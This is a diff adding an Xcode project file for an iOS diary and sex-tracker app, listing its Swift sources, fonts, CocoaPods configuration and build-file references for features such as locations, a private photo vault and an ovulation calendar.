@@ -1,0 +1,1139 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 56;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		4D81CBA9716C579F1B7E36A2 /* Pods_Scratch_Adventure.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = B29B8ED6C138521BB21E3F4B /* Pods_Scratch_Adventure.framework */; };
+		CE147DDD2DC235E8009BB637 /* PhotoGridView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE147DDC2DC235E8009BB637 /* PhotoGridView.swift */; };
+		CE14CE482DC0D2B5001EA13C /* LocationPickerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE14CE472DC0D2B5001EA13C /* LocationPickerViewController.swift */; };
+		CE14CE4A2DC0DF8C001EA13C /* LocationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE14CE492DC0DF8C001EA13C /* LocationManager.swift */; };
+		CE14CE4C2DC1024C001EA13C /* LocationView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE14CE4B2DC1024C001EA13C /* LocationView.swift */; };
+		CE1DEC782DDF2F89005C10AA /* AddMoreLocationViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE1DEC772DDF2F89005C10AA /* AddMoreLocationViewController.swift */; };
+		CE1DEC7B2DDF4933005C10AA /* LocationItemCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE1DEC7A2DDF4933005C10AA /* LocationItemCell.swift */; };
+		CE1DEC7D2DDF4962005C10AA /* AddLocationItemCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE1DEC7C2DDF4962005C10AA /* AddLocationItemCell.swift */; };
+		CE1DEC7F2DDF4979005C10AA /* LocationItemSubCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE1DEC7E2DDF4979005C10AA /* LocationItemSubCell.swift */; };
+		CE1FFEF92DE088F0007A1527 /* VaultPinSetupViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE1FFEF82DE088F0007A1527 /* VaultPinSetupViewController.swift */; };
+		CE32142F2DC36D040045015C /* LocationTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE32142E2DC36D040045015C /* LocationTableViewCell.swift */; };
+		CE3214332DC37F5B0045015C /* MapViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE3214322DC37F5B0045015C /* MapViewController.swift */; };
+		CE3214382DC394A70045015C /* LocationContainTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE3214372DC394A70045015C /* LocationContainTableViewCell.swift */; };
+		CE347CB82DE462F900D75873 /* PrivateVaultViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE347CB72DE462F900D75873 /* PrivateVaultViewController.swift */; };
+		CE3768682DCA11F6000B0EBC /* AddDiaryNoteFilledViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE3768672DCA11F6000B0EBC /* AddDiaryNoteFilledViewController.swift */; };
+		CE37686C2DCA13A8000B0EBC /* NoteRatingTableCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE37686B2DCA13A8000B0EBC /* NoteRatingTableCell.swift */; };
+		CE37686E2DCA1C5E000B0EBC /* AddDiaryinitiatorTableCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE37686D2DCA1C5E000B0EBC /* AddDiaryinitiatorTableCell.swift */; };
+		CE3768702DCA2D95000B0EBC /* LocationDetailCardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE37686F2DCA2D94000B0EBC /* LocationDetailCardView.swift */; };
+		CE3768722DCA2DBB000B0EBC /* ExperienceFilledNoteTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE3768712DCA2DBB000B0EBC /* ExperienceFilledNoteTableViewCell.swift */; };
+		CE406A352DE9CB4F00C5193C /* RecordAudioAlertViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE406A342DE9CB4F00C5193C /* RecordAudioAlertViewController.swift */; };
+		CE406A372DE9D45600C5193C /* AudioRecorderPopupViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE406A362DE9D45600C5193C /* AudioRecorderPopupViewController.swift */; };
+		CE406A3A2DE9D5C000C5193C /* MediaOptionCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE406A392DE9D5C000C5193C /* MediaOptionCell.swift */; };
+		CE4CA7F62DDC7C2B00688365 /* AddActivityViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE4CA7F52DDC7C2B00688365 /* AddActivityViewController.swift */; };
+		CE4CA7F82DDC8FA300688365 /* AddCustomActivityViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE4CA7F72DDC8FA300688365 /* AddCustomActivityViewController.swift */; };
+		CE5B096E2DE4992E00AD01B4 /* ImagePickerBottomSheet.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE5B096D2DE4992E00AD01B4 /* ImagePickerBottomSheet.swift */; };
+		CE5B09702DE4A00200AD01B4 /* VaultDataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE5B096F2DE4A00200AD01B4 /* VaultDataManager.swift */; };
+		CE7A7A052DE5B7B300E26410 /* DeletevaultImagePopupViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE7A7A042DE5B7B300E26410 /* DeletevaultImagePopupViewController.swift */; };
+		CE7A7A082DE5C7D400E26410 /* PrivateImageCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE7A7A072DE5C7D400E26410 /* PrivateImageCell.swift */; };
+		CE7A7A0D2DE5D30E00E26410 /* SexTrackerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE7A7A0C2DE5D30E00E26410 /* SexTrackerViewController.swift */; };
+		CE8ADAC92DB8FD0B00D7543D /* NoteTagesCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE8ADAC82DB8FD0B00D7543D /* NoteTagesCollectionViewCell.swift */; };
+		CE8BF7FC2DDB3CDF00CFFE16 /* AddPositionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE8BF7FB2DDB3CDF00CFFE16 /* AddPositionViewController.swift */; };
+		CE8BF7FE2DDB5D2900CFFE16 /* PositionDataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE8BF7FD2DDB5D2900CFFE16 /* PositionDataManager.swift */; };
+		CE8CFD672DBA5641000D111B /* CustomContainerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE8CFD642DBA5640000D111B /* CustomContainerView.swift */; };
+		CE8CFD682DBA5641000D111B /* HorizontalCalendarView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE8CFD652DBA5640000D111B /* HorizontalCalendarView.swift */; };
+		CE95F07B2DDDDA36009C4F09 /* WhereLocationListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE95F07A2DDDDA36009C4F09 /* WhereLocationListViewController.swift */; };
+		CEAE328F2DBB895D00EC4AF4 /* AddDiaryNoteViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEAE328E2DBB895D00EC4AF4 /* AddDiaryNoteViewController.swift */; };
+		CEAE32922DBB8AE700EC4AF4 /* HorizontalCalenderTableCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEAE32912DBB8AE700EC4AF4 /* HorizontalCalenderTableCell.swift */; };
+		CEAE32942DBB8FAD00EC4AF4 /* RatingTableCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEAE32932DBB8FAD00EC4AF4 /* RatingTableCell.swift */; };
+		CEAE32962DBBAD7700EC4AF4 /* AddDiaryContraceptionTableCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEAE32952DBBAD7700EC4AF4 /* AddDiaryContraceptionTableCell.swift */; };
+		CEB2484D2DBF884700B62F2F /* PositionTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEB2484C2DBF884700B62F2F /* PositionTableViewCell.swift */; };
+		CEB248512DBF9D9E00B62F2F /* ActivityTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEB248502DBF9D9E00B62F2F /* ActivityTableViewCell.swift */; };
+		CEB248532DBFA76300B62F2F /* ExperienceNoteTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEB248522DBFA76300B62F2F /* ExperienceNoteTableViewCell.swift */; };
+		CEB248552DBFAD3A00B62F2F /* AddPhotosView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEB248542DBFAD3A00B62F2F /* AddPhotosView.swift */; };
+		CEE2414B2DB79D8700EBD2AA /* LeaderboardsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE241482DB79D8600EBD2AA /* LeaderboardsViewController.swift */; };
+		CEE2414C2DB79D8700EBD2AA /* NotesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE241492DB79D8700EBD2AA /* NotesViewController.swift */; };
+		CEE2414E2DB79FC100EBD2AA /* LeaderboardItemCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE2414D2DB79FC100EBD2AA /* LeaderboardItemCell.swift */; };
+		CEE241512DB7A02C00EBD2AA /* NoteTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE241502DB7A02C00EBD2AA /* NoteTableViewCell.swift */; };
+		CEE241572DB7ADC000EBD2AA /* SheetContentViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE241562DB7ADC000EBD2AA /* SheetContentViewController.swift */; };
+		CEE29C0D2DB63CD100854BC6 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C0C2DB63CD100854BC6 /* AppDelegate.swift */; };
+		CEE29C0F2DB63CD100854BC6 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C0E2DB63CD100854BC6 /* SceneDelegate.swift */; };
+		CEE29C142DB63CD100854BC6 /* Base in Resources */ = {isa = PBXBuildFile; fileRef = CEE29C132DB63CD100854BC6 /* Base */; };
+		CEE29C162DB63CD300854BC6 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = CEE29C152DB63CD300854BC6 /* Assets.xcassets */; };
+		CEE29C192DB63CD300854BC6 /* Base in Resources */ = {isa = PBXBuildFile; fileRef = CEE29C182DB63CD300854BC6 /* Base */; };
+		CEE29CE72DB63DC300854BC6 /* MonthCalendarViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C202DB63DC200854BC6 /* MonthCalendarViewCell.swift */; };
+		CEE29CE82DB63DC300854BC6 /* MonthCalendarViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = CEE29C212DB63DC200854BC6 /* MonthCalendarViewCell.xib */; };
+		CEE29CE92DB63DC300854BC6 /* MonthScrollPicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C222DB63DC200854BC6 /* MonthScrollPicker.swift */; };
+		CEE29CEA2DB63DC300854BC6 /* MonthScrollPicker.xib in Resources */ = {isa = PBXBuildFile; fileRef = CEE29C232DB63DC200854BC6 /* MonthScrollPicker.xib */; };
+		CEE29CEB2DB63DC300854BC6 /* MonthScrollPicker+Protocols.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C242DB63DC200854BC6 /* MonthScrollPicker+Protocols.swift */; };
+		CEE29CEC2DB63DC300854BC6 /* Date+Days.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C262DB63DC200854BC6 /* Date+Days.swift */; };
+		CEE29CED2DB63DC300854BC6 /* Date+Format.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C272DB63DC200854BC6 /* Date+Format.swift */; };
+		CEE29CEE2DB63DC300854BC6 /* DateInsertType.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C282DB63DC200854BC6 /* DateInsertType.swift */; };
+		CEE29CEF2DB63DC300854BC6 /* DateScrollItem.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C292DB63DC200854BC6 /* DateScrollItem.swift */; };
+		CEE29CF02DB63DC300854BC6 /* DateScrollManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C2A2DB63DC200854BC6 /* DateScrollManager.swift */; };
+		CEE29CF12DB63DC300854BC6 /* DateScrollPicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C2B2DB63DC200854BC6 /* DateScrollPicker.swift */; };
+		CEE29CF22DB63DC300854BC6 /* DateScrollPicker.xib in Resources */ = {isa = PBXBuildFile; fileRef = CEE29C2C2DB63DC200854BC6 /* DateScrollPicker.xib */; };
+		CEE29CF32DB63DC300854BC6 /* DateScrollPicker+Protocols.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C2D2DB63DC200854BC6 /* DateScrollPicker+Protocols.swift */; };
+		CEE29CF42DB63DC300854BC6 /* DateScrollPickerFormat.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C2E2DB63DC200854BC6 /* DateScrollPickerFormat.swift */; };
+		CEE29CF52DB63DC300854BC6 /* DateViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C2F2DB63DC200854BC6 /* DateViewCell.swift */; };
+		CEE29CF62DB63DC300854BC6 /* DateViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = CEE29C302DB63DC200854BC6 /* DateViewCell.xib */; };
+		CEE29CF72DB63DC300854BC6 /* SeparatorViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C312DB63DC200854BC6 /* SeparatorViewCell.swift */; };
+		CEE29CF82DB63DC300854BC6 /* SeparatorViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = CEE29C322DB63DC200854BC6 /* SeparatorViewCell.xib */; };
+		CEE29CF92DB63DC300854BC6 /* UICollectionView+Fade.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C332DB63DC200854BC6 /* UICollectionView+Fade.swift */; };
+		CEE29CFA2DB63DC300854BC6 /* UICollectionViewCell+Fade.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C342DB63DC200854BC6 /* UICollectionViewCell+Fade.swift */; };
+		CEE29CFB2DB63DC300854BC6 /* UIView+Nib.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C352DB63DC200854BC6 /* UIView+Nib.swift */; };
+		CEE29CFC2DB63DC300854BC6 /* ZHCroppedDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C372DB63DC200854BC6 /* ZHCroppedDelegate.swift */; };
+		CEE29CFD2DB63DC300854BC6 /* ZHWaveformView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C382DB63DC200854BC6 /* ZHWaveformView.swift */; };
+		CEE29CFE2DB63DC300854BC6 /* ZHWaveformViewDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C392DB63DC200854BC6 /* ZHWaveformViewDelegate.swift */; };
+		CEE29CFF2DB63DC300854BC6 /* CenteredCollectionViewFlowLayout.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C3B2DB63DC200854BC6 /* CenteredCollectionViewFlowLayout.swift */; };
+		CEE29D002DB63DC300854BC6 /* CustomLoader.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C3C2DB63DC200854BC6 /* CustomLoader.swift */; };
+		CEE29D012DB63DC300854BC6 /* CustomLoaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C3D2DB63DC200854BC6 /* CustomLoaderView.swift */; };
+		CEE29D022DB63DC300854BC6 /* Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C3E2DB63DC200854BC6 /* Extension.swift */; };
+		CEE29D032DB63DC300854BC6 /* GradientButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C3F2DB63DC200854BC6 /* GradientButton.swift */; };
+		CEE29D042DB63DC300854BC6 /* PagingCollectionViewLayout.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C402DB63DC200854BC6 /* PagingCollectionViewLayout.swift */; };
+		CEE29D052DB63DC300854BC6 /* RCValues.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C412DB63DC200854BC6 /* RCValues.swift */; };
+		CEE29D062DB63DC300854BC6 /* SwipeCardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C422DB63DC200854BC6 /* SwipeCardView.swift */; };
+		CEE29D072DB63DC300854BC6 /* VPCollectionViewLayout.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C432DB63DC200854BC6 /* VPCollectionViewLayout.swift */; };
+		CEE29D082DB63DC300854BC6 /* Poppins-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = CEE29C452DB63DC200854BC6 /* Poppins-Bold.ttf */; };
+		CEE29D092DB63DC300854BC6 /* Poppins-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = CEE29C462DB63DC200854BC6 /* Poppins-Medium.ttf */; };
+		CEE29D0A2DB63DC300854BC6 /* Poppins-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = CEE29C472DB63DC200854BC6 /* Poppins-Regular.ttf */; };
+		CEE29D0B2DB63DC300854BC6 /* Poppins-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = CEE29C482DB63DC200854BC6 /* Poppins-SemiBold.ttf */; };
+		CEE29D4D2DB63DC300854BC6 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29C9E2DB63DC300854BC6 /* HomeViewController.swift */; };
+		CEE29D652DB63DC300854BC6 /* addLoadingIndicator.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CC12DB63DC300854BC6 /* addLoadingIndicator.swift */; };
+		CEE29D662DB63DC300854BC6 /* ExtensionProVersion.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CC22DB63DC300854BC6 /* ExtensionProVersion.swift */; };
+		CEE29D672DB63DC300854BC6 /* InAppPurchase.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CC32DB63DC300854BC6 /* InAppPurchase.swift */; };
+		CEE29D682DB63DC300854BC6 /* LoadingIndicatorHUD.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CC42DB63DC300854BC6 /* LoadingIndicatorHUD.swift */; };
+		CEE29D692DB63DC300854BC6 /* NetworkManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CC52DB63DC300854BC6 /* NetworkManager.swift */; };
+		CEE29D6A2DB63DC300854BC6 /* Purchase functionality.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CC62DB63DC300854BC6 /* Purchase functionality.swift */; };
+		CEE29D6C2DB63DC300854BC6 /* UIActivityIndicatorView Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CC82DB63DC300854BC6 /* UIActivityIndicatorView Extension.swift */; };
+		CEE29D6D2DB63DC300854BC6 /* ButtonTapAnimationExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CCA2DB63DC300854BC6 /* ButtonTapAnimationExtension.swift */; };
+		CEE29D6E2DB63DC300854BC6 /* ColorHelper.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CCB2DB63DC300854BC6 /* ColorHelper.swift */; };
+		CEE29D6F2DB63DC300854BC6 /* CustomeDateStackView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CCC2DB63DC300854BC6 /* CustomeDateStackView.swift */; };
+		CEE29D702DB63DC300854BC6 /* CustomNavigationBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CCD2DB63DC300854BC6 /* CustomNavigationBar.swift */; };
+		CEE29D712DB63DC300854BC6 /* FirestoreManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CCE2DB63DC300854BC6 /* FirestoreManager.swift */; };
+		CEE29D722DB63DC300854BC6 /* FontHelper.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CCF2DB63DC300854BC6 /* FontHelper.swift */; };
+		CEE29D732DB63DC300854BC6 /* LocalizationHelper.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CD02DB63DC300854BC6 /* LocalizationHelper.swift */; };
+		CEE29D742DB63DC300854BC6 /* MultiLanguage.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CD12DB63DC300854BC6 /* MultiLanguage.swift */; };
+		CEE29D752DB63DC300854BC6 /* OvulationCircularCalendarView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CD22DB63DC300854BC6 /* OvulationCircularCalendarView.swift */; };
+		CEE29D762DB63DC300854BC6 /* PushNotificationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CD32DB63DC300854BC6 /* PushNotificationManager.swift */; };
+		CEE29D772DB63DC300854BC6 /* ReviewAlertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CD42DB63DC300854BC6 /* ReviewAlertView.swift */; };
+		CEE29D782DB63DC300854BC6 /* UIHelper.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29CD52DB63DC300854BC6 /* UIHelper.swift */; };
+		CEE29D882DB664E100854BC6 /* CalenderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEE29D872DB664E100854BC6 /* CalenderViewController.swift */; };
+		CEF8E2892DBA49C600C3D333 /* DateNoteViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CEF8E2882DBA49C600C3D333 /* DateNoteViewController.swift */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		5F5108B973FDDD8FA325C749 /* Pods-Scratch Adventure.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Scratch Adventure.release.xcconfig"; path = "Target Support Files/Pods-Scratch Adventure/Pods-Scratch Adventure.release.xcconfig"; sourceTree = "<group>"; };
+		651F7FC6B45547F55968C1F4 /* Pods-Scratch Adventure.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Scratch Adventure.debug.xcconfig"; path = "Target Support Files/Pods-Scratch Adventure/Pods-Scratch Adventure.debug.xcconfig"; sourceTree = "<group>"; };
+		B29B8ED6C138521BB21E3F4B /* Pods_Scratch_Adventure.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Scratch_Adventure.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		CE147DDC2DC235E8009BB637 /* PhotoGridView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoGridView.swift; sourceTree = "<group>"; };
+		CE14CE472DC0D2B5001EA13C /* LocationPickerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationPickerViewController.swift; sourceTree = "<group>"; };
+		CE14CE492DC0DF8C001EA13C /* LocationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationManager.swift; sourceTree = "<group>"; };
+		CE14CE4B2DC1024C001EA13C /* LocationView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationView.swift; sourceTree = "<group>"; };
+		CE1DEC772DDF2F89005C10AA /* AddMoreLocationViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddMoreLocationViewController.swift; sourceTree = "<group>"; };
+		CE1DEC7A2DDF4933005C10AA /* LocationItemCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationItemCell.swift; sourceTree = "<group>"; };
+		CE1DEC7C2DDF4962005C10AA /* AddLocationItemCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddLocationItemCell.swift; sourceTree = "<group>"; };
+		CE1DEC7E2DDF4979005C10AA /* LocationItemSubCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationItemSubCell.swift; sourceTree = "<group>"; };
+		CE1FFEF82DE088F0007A1527 /* VaultPinSetupViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VaultPinSetupViewController.swift; sourceTree = "<group>"; };
+		CE32142E2DC36D040045015C /* LocationTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationTableViewCell.swift; sourceTree = "<group>"; };
+		CE3214322DC37F5B0045015C /* MapViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MapViewController.swift; sourceTree = "<group>"; };
+		CE3214372DC394A70045015C /* LocationContainTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationContainTableViewCell.swift; sourceTree = "<group>"; };
+		CE347CB72DE462F900D75873 /* PrivateVaultViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PrivateVaultViewController.swift; sourceTree = "<group>"; };
+		CE3768672DCA11F6000B0EBC /* AddDiaryNoteFilledViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddDiaryNoteFilledViewController.swift; sourceTree = "<group>"; };
+		CE37686B2DCA13A8000B0EBC /* NoteRatingTableCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NoteRatingTableCell.swift; sourceTree = "<group>"; };
+		CE37686D2DCA1C5E000B0EBC /* AddDiaryinitiatorTableCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddDiaryinitiatorTableCell.swift; sourceTree = "<group>"; };
+		CE37686F2DCA2D94000B0EBC /* LocationDetailCardView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationDetailCardView.swift; sourceTree = "<group>"; };
+		CE3768712DCA2DBB000B0EBC /* ExperienceFilledNoteTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ExperienceFilledNoteTableViewCell.swift; sourceTree = "<group>"; };
+		CE406A342DE9CB4F00C5193C /* RecordAudioAlertViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RecordAudioAlertViewController.swift; sourceTree = "<group>"; };
+		CE406A362DE9D45600C5193C /* AudioRecorderPopupViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AudioRecorderPopupViewController.swift; sourceTree = "<group>"; };
+		CE406A392DE9D5C000C5193C /* MediaOptionCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MediaOptionCell.swift; sourceTree = "<group>"; };
+		CE4CA7F52DDC7C2B00688365 /* AddActivityViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddActivityViewController.swift; sourceTree = "<group>"; };
+		CE4CA7F72DDC8FA300688365 /* AddCustomActivityViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddCustomActivityViewController.swift; sourceTree = "<group>"; };
+		CE5B096D2DE4992E00AD01B4 /* ImagePickerBottomSheet.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImagePickerBottomSheet.swift; sourceTree = "<group>"; };
+		CE5B096F2DE4A00200AD01B4 /* VaultDataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VaultDataManager.swift; sourceTree = "<group>"; };
+		CE7A7A042DE5B7B300E26410 /* DeletevaultImagePopupViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeletevaultImagePopupViewController.swift; sourceTree = "<group>"; };
+		CE7A7A072DE5C7D400E26410 /* PrivateImageCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PrivateImageCell.swift; sourceTree = "<group>"; };
+		CE7A7A0C2DE5D30E00E26410 /* SexTrackerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SexTrackerViewController.swift; sourceTree = "<group>"; };
+		CE8ADAC82DB8FD0B00D7543D /* NoteTagesCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NoteTagesCollectionViewCell.swift; sourceTree = "<group>"; };
+		CE8BF7FB2DDB3CDF00CFFE16 /* AddPositionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddPositionViewController.swift; sourceTree = "<group>"; };
+		CE8BF7FD2DDB5D2900CFFE16 /* PositionDataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PositionDataManager.swift; sourceTree = "<group>"; };
+		CE8CFD642DBA5640000D111B /* CustomContainerView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CustomContainerView.swift; sourceTree = "<group>"; };
+		CE8CFD652DBA5640000D111B /* HorizontalCalendarView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HorizontalCalendarView.swift; sourceTree = "<group>"; };
+		CE95F07A2DDDDA36009C4F09 /* WhereLocationListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhereLocationListViewController.swift; sourceTree = "<group>"; };
+		CEAE328E2DBB895D00EC4AF4 /* AddDiaryNoteViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddDiaryNoteViewController.swift; sourceTree = "<group>"; };
+		CEAE32912DBB8AE700EC4AF4 /* HorizontalCalenderTableCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HorizontalCalenderTableCell.swift; sourceTree = "<group>"; };
+		CEAE32932DBB8FAD00EC4AF4 /* RatingTableCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RatingTableCell.swift; sourceTree = "<group>"; };
+		CEAE32952DBBAD7700EC4AF4 /* AddDiaryContraceptionTableCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddDiaryContraceptionTableCell.swift; sourceTree = "<group>"; };
